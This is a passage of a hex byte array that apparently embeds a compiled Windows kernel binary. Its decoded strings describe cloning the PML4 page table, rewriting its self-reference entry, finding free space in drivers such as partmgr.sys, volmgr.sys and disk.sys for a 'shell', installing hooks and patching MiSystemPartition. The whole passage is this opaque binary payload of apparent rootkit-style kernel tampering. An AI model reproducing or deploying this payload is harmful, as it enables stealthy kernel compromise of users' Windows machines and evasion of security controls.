    0x77, 0x73, 0x20, 0x31, 0x31, 0x20, 0x32, 0x31, 0x48, 0x32, 0x20, 0x28, 0x62, 0x75, 0x69, 0x6C,
    0x64, 0x20, 0x25, 0x75, 0x29, 0x2C, 0x20, 0x75, 0x73, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x66, 0x66,
    0x73, 0x65, 0x74, 0x20, 0x30, 0x78, 0x31, 0x42, 0x31, 0x30, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x74, 0x6F, 0x6F, 0x20, 0x6D, 0x61, 0x6E, 0x79, 0x20,
    0x66, 0x72, 0x65, 0x65, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x73, 0x20, 0x66, 0x6F, 0x75, 0x6E,
    0x64, 0x2C, 0x20, 0x69, 0x6E, 0x63, 0x72, 0x65, 0x61, 0x73, 0x65, 0x20, 0x4D, 0x41, 0x58, 0x5F,
    0x46, 0x52, 0x45, 0x45, 0x5F, 0x53, 0x50, 0x41, 0x43, 0x45, 0x53, 0x2E, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64,
    0x20, 0x61, 0x6E, 0x64, 0x20, 0x66, 0x6C, 0x75, 0x73, 0x68, 0x65, 0x64, 0x20, 0x6E, 0x65, 0x77,
    0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x61, 0x74, 0x20, 0x30,
    0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x28, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x61, 0x64, 0x64,
    0x72, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x29, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x76,
    0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x61,
    0x66, 0x74, 0x65, 0x72, 0x20, 0x6F, 0x76, 0x65, 0x72, 0x77, 0x72, 0x69, 0x74, 0x65, 0x5F, 0x70,
    0x61, 0x67, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x28, 0x70, 0x68, 0x79,
    0x73, 0x69, 0x63, 0x61, 0x6C, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x29, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x75, 0x70, 0x64, 0x61, 0x74,
    0x65, 0x64, 0x20, 0x73, 0x65, 0x6C, 0x66, 0x2D, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63,
    0x65, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x61, 0x74, 0x20, 0x69, 0x6E, 0x64, 0x65, 0x78,
    0x20, 0x25, 0x75, 0x20, 0x74, 0x6F, 0x20, 0x70, 0x6F, 0x69, 0x6E, 0x74, 0x20, 0x74, 0x6F, 0x20,
    0x63, 0x6C, 0x6F, 0x6E, 0x65, 0x64, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x20, 0x28, 0x50, 0x46, 0x4E,
    0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x29, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x73, 0x65, 0x61, 0x72, 0x63, 0x68, 0x69, 0x6E, 0x67, 0x20,
    0x66, 0x6F, 0x72, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x20, 0x73, 0x65, 0x6C, 0x66, 0x2D, 0x72, 0x65,
    0x66, 0x65, 0x72, 0x65, 0x6E, 0x63, 0x65, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x28, 0x43,
    0x52, 0x33, 0x20, 0x50, 0x46, 0x4E, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x29, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68, 0x6F, 0x6F, 0x6B,
    0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x65, 0x64, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78,
    0x25, 0x6C, 0x6C, 0x78, 0x20, 0x28, 0x50, 0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x29, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6E, 0x6F,
    0x20, 0x61, 0x76, 0x61, 0x69, 0x6C, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x45,
    0x20, 0x65, 0x6E, 0x74, 0x72, 0x69, 0x65, 0x73, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x69,
    0x6E, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x20, 0x5B, 0x25, 0x75, 0x2C, 0x20, 0x25, 0x75, 0x29,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76,
    0x61, 0x6C, 0x69, 0x64, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x20, 0x69, 0x6E, 0x64, 0x65, 0x78, 0x20,
    0x72, 0x61, 0x6E, 0x67, 0x65, 0x3A, 0x20, 0x5B, 0x25, 0x75, 0x2C, 0x20, 0x25, 0x75, 0x29, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x73, 0x65, 0x61, 0x72,
    0x63, 0x68, 0x69, 0x6E, 0x67, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20,
    0x6F, 0x66, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x28,
    0x25, 0x64, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73, 0x29, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x69, 0x6E, 0x67,
    0x20, 0x56, 0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x28, 0x70, 0x61, 0x67,
    0x65, 0x20, 0x25, 0x7A, 0x75, 0x2F, 0x25, 0x7A, 0x75, 0x2C, 0x20, 0x74, 0x79, 0x70, 0x65, 0x3A,
    0x20, 0x25, 0x73, 0x29, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x73, 0x65, 0x6C, 0x65, 0x63,
    0x74, 0x20, 0x72, 0x61, 0x6E, 0x64, 0x6F, 0x6D, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x45, 0x20, 0x69,
    0x6E, 0x64, 0x65, 0x78, 0x20, 0x28, 0x73, 0x68, 0x6F, 0x75, 0x6C, 0x64, 0x20, 0x6E, 0x6F, 0x74,
    0x20, 0x72, 0x65, 0x61, 0x63, 0x68, 0x20, 0x68, 0x65, 0x72, 0x65, 0x29, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,
    0x20, 0x25, 0x75, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x61, 0x63, 0x74, 0x69, 0x76,
    0x65, 0x20, 0x28, 0x65, 0x78, 0x69, 0x74, 0x20, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x3A, 0x20,
    0x30, 0x78, 0x25, 0x30, 0x38, 0x58, 0x29, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x25, 0x73, 0x20, 0x69,
    0x6E, 0x64, 0x65, 0x78, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x20, 0x62, 0x6F, 0x75, 0x6E, 0x64,
    0x73, 0x3A, 0x20, 0x25, 0x75, 0x2D, 0x25, 0x75, 0x20, 0x28, 0x6D, 0x61, 0x78, 0x20, 0x35, 0x31,
    0x31, 0x29, 0x00, 0x6F, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6F, 0x72, 0x28, 0x29, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20,
    0x66, 0x72, 0x65, 0x65, 0x20, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x61, 0x74, 0x3A, 0x20, 0x25,
    0x70, 0x2C, 0x20, 0x6D, 0x61, 0x72, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65,
    0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x20, 0x61, 0x64, 0x64, 0x72,
    0x65, 0x73, 0x73, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x74, 0x6F, 0x20, 0x65, 0x6E, 0x64, 0x20,
    0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x28, 0x20, 0x6D,
    0x61, 0x78, 0x20, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x20, 0x74, 0x68,
    0x61, 0x74, 0x20, 0x63, 0x61, 0x6E, 0x20, 0x66, 0x69, 0x74, 0x3A, 0x20, 0x25, 0x7A, 0x75, 0x20,
    0x29, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x75, 0x6E,
    0x73, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x65, 0x64, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
    0x73, 0x20, 0x62, 0x75, 0x69, 0x6C, 0x64, 0x3A, 0x20, 0x25, 0x75, 0x0A, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x54, 0x6F, 0x74,
    0x61, 0x6C, 0x20, 0x50, 0x61, 0x67, 0x65, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x48, 0x69, 0x67, 0x68, 0x65, 0x73, 0x74, 0x20, 0x50, 0x46, 0x4E, 0x3A, 0x20, 0x30, 0x78, 0x25,
    0x70, 0x0A, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x4C, 0x6F, 0x77, 0x65, 0x73, 0x74, 0x20, 0x50, 0x46, 0x4E, 0x3A, 0x20, 0x20,
    0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x4D, 0x6D, 0x47, 0x65, 0x74, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x4D,
    0x65, 0x6D, 0x6F, 0x72, 0x79, 0x52, 0x61, 0x6E, 0x67, 0x65, 0x73, 0x20, 0x66, 0x61, 0x69, 0x6C,
    0x65, 0x64, 0x0A, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20,
    0x53, 0x75, 0x6D, 0x6D, 0x61, 0x72, 0x79, 0x3A, 0x0A, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x73, 0x65, 0x74, 0x20, 0x66, 0x6C, 0x61, 0x67, 0x20, 0x69,
    0x6E, 0x20, 0x4D, 0x69, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x50, 0x61, 0x72, 0x74, 0x69, 0x74,
    0x69, 0x6F, 0x6E, 0x20, 0x61, 0x74, 0x20, 0x6F, 0x66, 0x66, 0x73, 0x65, 0x74, 0x20, 0x30, 0x78,
    0x25, 0x58, 0x20, 0x74, 0x6F, 0x20, 0x30, 0x0A, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x52, 0x61, 0x6E, 0x67,
    0x65, 0x20, 0x25, 0x64, 0x3A, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x2D,
    0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x28, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x3A,
    0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x2D, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x29, 0x0A, 0x00, 0x00, 0x70, 0x00, 0x61, 0x00, 0x72, 0x00, 0x74, 0x00, 0x6D, 0x00, 0x67, 0x00,
    0x72, 0x00, 0x2E, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x00, 0x00, 0x76, 0x00, 0x6F, 0x00,
    0x6C, 0x00, 0x6D, 0x00, 0x67, 0x00, 0x72, 0x00, 0x2E, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00,
    0x00, 0x00, 0x63, 0x00, 0x6C, 0x00, 0x61, 0x00, 0x73, 0x00, 0x73, 0x00, 0x70, 0x00, 0x6E, 0x00,
    0x70, 0x00, 0x2E, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x00, 0x00, 0x64, 0x00, 0x69, 0x00,
    0x73, 0x00, 0x6B, 0x00, 0x2E, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x00, 0x00, 0x4B, 0x00,
    0x65, 0x00, 0x49, 0x00, 0x6E, 0x00, 0x76, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x69, 0x00, 0x64, 0x00,
    0x61, 0x00, 0x74, 0x00, 0x65, 0x00, 0x41, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x43, 0x00, 0x61, 0x00,
    0x63, 0x00, 0x68, 0x00, 0x65, 0x00, 0x73, 0x00, 0x00, 0x00, 0x68, 0x00, 0x61, 0x00, 0x6C, 0x00,
    0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x6F, 0x00,
    0x73, 0x00, 0x6B, 0x00, 0x72, 0x00, 0x6E, 0x00, 0x6C, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00,
    0x65, 0x00, 0x00, 0x00, 0x4B, 0x00, 0x65, 0x00, 0x46, 0x00, 0x6C, 0x00, 0x75, 0x00, 0x73, 0x00,
    0x68, 0x00, 0x45, 0x00, 0x6E, 0x00, 0x74, 0x00, 0x69, 0x00, 0x72, 0x00, 0x65, 0x00, 0x54, 0x00,
    0x62, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x75, 0x00, 0x6E, 0x00, 0x6B, 0x00, 0x6E, 0x00, 0x6F, 0x00,
    0x77, 0x00, 0x6E, 0x00, 0x3E, 0x00, 0x00, 0x00, 0x01, 0x07, 0x04, 0x00, 0x07, 0x72, 0x03, 0x30,
    0x02, 0x70, 0x01, 0x60, 0x01, 0x10, 0x09, 0x00, 0x10, 0x82, 0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70,
    0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00,
    0x04, 0x42, 0x00, 0x00, 0x01, 0x06, 0x03, 0x00, 0x06, 0x62, 0x02, 0x70, 0x01, 0x60, 0x00, 0x00,
    0x01, 0x10, 0x09, 0x00, 0x10, 0xA2, 0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0,
    0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x00, 0x00, 0x01, 0x0C, 0x06, 0x00, 0x0C, 0x01, 0x7D, 0x00,
    0x05, 0x30, 0x04, 0x70, 0x03, 0x60, 0x02, 0xE0, 0x01, 0x06, 0x03, 0x00, 0x06, 0x42, 0x02, 0x70,
    0x01, 0x60, 0x00, 0x00, 0x01, 0x0E, 0x08, 0x00, 0x0E, 0x72, 0x0A, 0x30, 0x09, 0x50, 0x08, 0x70,
    0x07, 0x60, 0x06, 0xC0, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x0B, 0x06, 0x00, 0x0B, 0x32, 0x07, 0x30,
    0x06, 0x70, 0x05, 0x60, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x07, 0x02, 0x00, 0x07, 0x01, 0x47, 0x00,
    0x01, 0x0B, 0x06, 0x00, 0x0B, 0xB2, 0x07, 0x30, 0x06, 0x70, 0x05, 0x60, 0x04, 0xE0, 0x02, 0xF0,
    0x01, 0x07, 0x02, 0x00, 0x07, 0x01, 0x69, 0x00, 0x01, 0x05, 0x02, 0x00, 0x05, 0x92, 0x01, 0x60,
    0x01, 0x1B, 0x0C, 0x00, 0x1B, 0x68, 0x18, 0x00, 0x13, 0x01, 0x33, 0x00, 0x0C, 0x30, 0x0B, 0x50,
    0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x1B, 0x0C, 0x00,
    0x1B, 0x68, 0x65, 0x00, 0x13, 0x01, 0xCD, 0x00, 0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60,
    0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x10, 0x09, 0x00, 0x10, 0x12, 0x0C, 0x30,
    0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x00, 0x00,
    0x01, 0x07, 0x04, 0x00, 0x07, 0x32, 0x03, 0x30, 0x02, 0x70, 0x01, 0x60, 0x01, 0x09, 0x05, 0x00,
    0x09, 0x82, 0x05, 0x30, 0x04, 0x70, 0x03, 0x60, 0x02, 0xE0, 0x00, 0x00, 0x01, 0x10, 0x09, 0x00,
    0x10, 0xC2, 0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0,
    0x02, 0xF0, 0x00, 0x00, 0x01, 0x07, 0x04, 0x00, 0x07, 0x52, 0x03, 0x30, 0x02, 0x70, 0x01, 0x60,
    0x01, 0x0C, 0x07, 0x00, 0x0C, 0x82, 0x08, 0x30, 0x07, 0x50, 0x06, 0x70, 0x05, 0x60, 0x04, 0xE0,
    0x02, 0xF0, 0x00, 0x00, 0x01, 0x0B, 0x06, 0x00, 0x0B, 0x52, 0x07, 0x30, 0x06, 0x70, 0x05, 0x60,
    0x04, 0xE0, 0x02, 0xF0, 0x01, 0x0D, 0x07, 0x00, 0x0D, 0x62, 0x09, 0x30, 0x08, 0x70, 0x07, 0x60,
    0x06, 0xC0, 0x04, 0xE0, 0x02, 0xF0, 0x00, 0x00, 0x01, 0x05, 0x02, 0x00, 0x05, 0x32, 0x01, 0x60,
    0x01, 0x0F, 0x08, 0x00, 0x0F, 0x32, 0x0B, 0x30, 0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0,
    0x04, 0xE0, 0x02, 0xF0, 0x01, 0x0F, 0x08, 0x00, 0x0F, 0x52, 0x0B, 0x30, 0x0A, 0x70, 0x09, 0x60,
    0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x13, 0x0A, 0x00, 0x13, 0x01, 0x13, 0x00,
    0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0,
    0x01, 0x13, 0x0A, 0x00, 0x13, 0x01, 0xB9, 0x00, 0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60,
    0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x13, 0x0A, 0x00, 0x13, 0x01, 0x89, 0x00,
    0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0,
    0x01, 0x0C, 0x07, 0x00, 0x0C, 0xA2, 0x08, 0x30, 0x07, 0x50, 0x06, 0x70, 0x05, 0x60, 0x04, 0xE0,
    0x02, 0xF0, 0x00, 0x00, 0x01, 0x0E, 0x08, 0x00, 0x0E, 0x32, 0x0A, 0x30, 0x09, 0x50, 0x08, 0x70,
    0x07, 0x60, 0x06, 0xC0, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x0C, 0x07, 0x00, 0x0C, 0x62, 0x08, 0x30,
    0x07, 0x50, 0x06, 0x70, 0x05, 0x60, 0x04, 0xE0, 0x02, 0xF0, 0x00, 0x00, 0x01, 0x10, 0x09, 0x00,
    0x10, 0x42, 0x0C, 0x30, 0x0B, 0x50, 0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0,
    0x02, 0xF0, 0x00, 0x00, 0x01, 0x13, 0x0A, 0x00, 0x13, 0x01, 0x15, 0x00, 0x0C, 0x30, 0x0B, 0x50,
    0x0A, 0x70, 0x09, 0x60, 0x08, 0xC0, 0x06, 0xD0, 0x04, 0xE0, 0x02, 0xF0, 0x01, 0x04, 0x01, 0x00,
    0x04, 0x62, 0x00, 0x00, 0x01, 0x07, 0x02, 0x00, 0x07, 0x01, 0x27, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0C, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x20, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA3, 0xA8, 0xA3, 0xA8, 0xA3, 0xA8, 0xA3, 0xA8, 0xA3, 0xA8, 0xA3, 0xA8, 0xA3, 0xA8, 0xA3, 0xA8,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAC, 0xAA, 0xB2, 0xAA, 0x9F, 0x9F, 0x9F, 0x9F,
    0xB5, 0xA3, 0xA3, 0xA4, 0xAA, 0xAA, 0xBA, 0xAA, 0x96, 0xAA, 0xA8, 0xAA, 0xC3, 0xC3, 0x96, 0x96,
    0xB7, 0xAE, 0xD6, 0xBD, 0xA3, 0xC5, 0xA3, 0xA3, 0x9F, 0xC3, 0x9C, 0xAA, 0xAA, 0xAC, 0xAA, 0xBF,
    0x03, 0x7F, 0x11, 0x7F, 0x01, 0x7F, 0x01, 0x3F, 0x01, 0x01, 0x90, 0x82, 0x7D, 0x97, 0x59, 0x59,
    0x59, 0x59, 0x59, 0x7F, 0x59, 0x59, 0x60, 0x7D, 0x7F, 0x7F, 0x59, 0x59, 0x59, 0x59, 0x59, 0x59,
    0x59, 0x59, 0x59, 0x59, 0x59, 0x59, 0x9A, 0x88, 0x7D, 0x59, 0x50, 0x50, 0x50, 0x50, 0x59, 0x59,
    0x59, 0x59, 0x61, 0x94, 0x61, 0x9E, 0x59, 0x59, 0x85, 0x59, 0x92, 0xA3, 0x60, 0x60, 0x59, 0x59,
    0x59, 0x59, 0x59, 0x59, 0x59, 0x59, 0x59, 0x59, 0x59, 0x9F, 0x01, 0x03, 0x01, 0x04, 0x03, 0xD5,
    0x03, 0xCC, 0x01, 0xBC, 0x03, 0xF0, 0x10, 0x10, 0x10, 0x10, 0x50, 0x50, 0x50, 0x50, 0x14, 0x20,
    0x20, 0x20, 0x20, 0x01, 0x01, 0x01, 0x01, 0xC4, 0x02, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01, 0x01,
    0xC0, 0xC2, 0x10, 0x11, 0x02, 0x03, 0x11, 0x03, 0x03, 0x04, 0x00, 0x00, 0x14, 0x00, 0x02, 0x00,
    0x00, 0xC6, 0xC8, 0x02, 0x02, 0x02, 0x02, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,
    0xFF, 0xCA, 0x01, 0x01, 0x01, 0x00, 0x06, 0x00, 0x04, 0x00, 0xC0, 0xC2, 0x01, 0x01, 0x03, 0x01,
    0xFF, 0xFF, 0x01, 0x00, 0x03, 0xC4, 0xC4, 0xC6, 0x03, 0x01, 0x01, 0x01, 0xFF, 0x03, 0x03, 0x03,
    0xC8, 0x40, 0x00, 0x0A, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x33, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xFF, 0xBF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0xBF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x00, 0xFF,
    0x4A, 0x4A, 0x4A, 0x4A, 0x4B, 0x52, 0x4A, 0x4A, 0x4A, 0x4A, 0x4F, 0x4C, 0x4A, 0x4A, 0x4A, 0x4A,
    0x4A, 0x4A, 0x4A, 0x4A, 0x55, 0x45, 0x40, 0x4A, 0x4A, 0x4A, 0x45, 0x59, 0x4D, 0x46, 0x4A, 0x5D,
